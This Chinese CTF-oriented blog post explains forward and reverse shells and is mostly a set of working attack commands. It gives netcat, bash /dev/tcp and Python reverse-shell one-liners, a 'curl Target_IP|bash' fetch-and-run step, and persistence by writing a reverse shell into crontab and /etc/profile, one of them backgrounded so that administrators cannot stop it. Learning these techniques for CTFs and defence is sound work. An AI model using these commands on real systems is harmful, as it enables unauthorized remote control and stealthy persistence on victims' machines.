---
title: 如何反弹shell
date: 2022-03-29 11:15:00
updated: 2022-03-29 11:15:00
tags: [ctf,security]
description: reverse shell
archive: false
---

# 浅谈如何反弹shell

## linux下常见网络工具🧀

### netcat

netcat也就是平时用的nc，是一种功能丰富的网络调试和调查工具，它可以产生用户可能需要的几乎任何类型的连接，可以连接到远程主机`nc  -nvv Targert_IP  Targert_Port`，监听本地主机`nc  -l  -p  Local_Port`，端口扫描`nc  -v  target_IP  target_Port`、端口监听`nc  -l  -p  local_Port`、远程文件传输`nc  Targert_IP  Targert_Port  <  Targert_File`、正向shell、反向shell等等。

### curl

在Linux中curl是一个利用URL规则在命令行下工作的文件传输工具，可以说是一款很强大的http命令行工具。它支持文件的上传和下载，是综合传输工具，这个工具可以帮助我们在服务器上很好的模拟http的行为。

### wget

wget是一个下载文件的工具，它用在命令行下。对于Linux用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。

### curl和wget的区别

wget是个专职的下载利器，简单，专一，极致；而curl可以下载，但是长项不在于下载，而在于模拟提交web数据，POST/GET请求，调试网页，等等。在下载上，也各有所长，wget可以递归，支持断点；而curl支持URL中加入变量，因此可以批量下载。个人用途上，我经常用wget来下载文件，加 -c选项不怕断网；使用curl 来跟网站的API 交互，简便清晰。

#### ping

ping命令本身处于应用层，相当于一个应用程序，它直接使用网络层的ICMP协议，ping用来检查网络是否通畅或者网络连接速度的命令。

### telnet

telnet协议是TCP/IP协议族的其中之一，是Internet远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet通常是用来探测指定ip是否开放指定端口。

### ssh

简单来书,ssh 和 telnet 是实现相同的功能 , ssh中 数据是经过加密的,是安全的 , 而 Telnet是明文传输的，ssh 是加密的，基于 SSL 。

## 正向shell如何连接

如果客户端连接服务器端，想要获取服务器端的shell，那么称为正向shell。

**目标主机：**

命令：`nc  -lvp  Targert_Port  -e  /bin/sh  `

![image-20220329101019243](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101019243.png)

**本地主机：**

命令：`nc  Targert_IP  Targert_Port `

![image-20220329101103804](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329101103804.png)

## 什么是反弹shell

>
>
>参考:
>
>https://xz.aliyun.com/t/9488
>
>https://zhuanlan.zhihu.com/p/138393396

反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？

有如下情况：

1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。

2.目标机器的ip动态改变，你不能持续控制。

3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。

4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。

那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。

## 弹shell的方式

### netcat

攻击机开启监听:`nc -lvp Target_Port`

-lvp中l指监听，v指输出交互过程，p为指定端口

靶机连接攻击机:`netcat Target_IP Target_Port -e /bin/bash `

![image-20220329104342323](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104342323.png)

![image-20220329104621670](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329104621670.png)

### Bash

同样的我们还是用nc -lvp Target_Port在攻击机的端口开启监听，`nc -lvp Target_Port`这次我们使用Bash结合重定向来反弹shell

`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`

bash -i 产生bash交互环境 >& 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port让目标主机发起与攻击机在Target_Port上的TCP连接，0>&1将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。

Bash产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。

![image-20220329105826704](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329105826704.png)

![image-20220329110013286](https://ek1ng-typora.oss-cn-hangzhou.aliyuncs.com/img/image-20220329110013286.png)

### Python脚本反弹shell

同样的我们还是在攻击机开始端口监听，`nc -lvp Target_Port`

在靶机上执行`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Target_IP",Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

### Others

反弹shell的方式很多，nc和bash是比较常见的方式，其他还有Telnet，Socat等工具可以反弹shell，或者写个python，php等脚本也可以反弹shell，比较琐碎的内容具体遇到了再查即可。

### 一些小技巧

因为有时候达成利用的方式可能比较间接，这些技巧可以在不同的情境下达成反弹shell的作用。

#### Curl反弹shell

简单来说就是将Bash重定向这一句内容写入文件，让靶机用curl下载这个文件并且执行，达到用Bash重定向相同的效果

首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：

`bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1`或者`bash -c "bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1"`

然后在目标机上执行如下，即可反弹shell

`curl Target_IP|bash`

#### 将反弹shell的命令写入定时任务

我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 `/var/spool/cron/[crontabs]/<username>` 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。

定时任务的理念就是每隔一段时间发送shell，以下为每隔1分钟发送shell

`*/1  *  *  *  *   /bin/bash -i>&/dev/tcp/Target_IP/Target_Port 0>&1`

#### 将反弹shell的命令写入/etc/profile文件

将反弹shell的命写入/etc/profile文件中，/etc/profile中的内容会在用户打开bash窗口时执行。

`/bin/bash -i >& /dev/tcp/Target_IP/Target_Port 0>&1 & `

 最后面那个&为的是防止管理员无法输入命令





